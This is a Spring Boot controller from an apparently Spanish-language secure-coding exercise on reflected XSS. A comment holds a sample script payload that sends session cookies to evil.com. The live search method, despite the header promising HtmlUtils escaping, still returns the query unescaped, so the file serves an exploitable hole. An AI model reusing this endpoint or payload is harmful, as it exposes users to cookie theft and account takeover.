// src/java/src/main/java/com/example/api/controller/SearchController.java
// PASO 24: XSS Reflected — escapar output HTML con HtmlUtils.htmlEscape

package com.example.api.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/xss")
public class SearchController {

    // VULNERABLE (punto de inicio del ejercicio):
    // @GetMapping("/search")
    // @ResponseBody
    // public String search(@RequestParam String q) {
    //     return "<html><body><h2>Resultados para: " + q + "</h2></body></html>";
    // }
    //
    // Un atacante puede enviar: q=<script>document.location='https://evil.com?c='+document.cookie</script>
    // El navegador de la victima ejecuta el script porque el HTML se devuelve sin escapar.
    // El atacante roba las cookies de sesion y toma control de la cuenta.

    @GetMapping("/search")
    @ResponseBody
    public String search(@RequestParam String q) {
        return "<html><body><h2>Resultados para: " + q + "</h2></body></html>";
    }
}
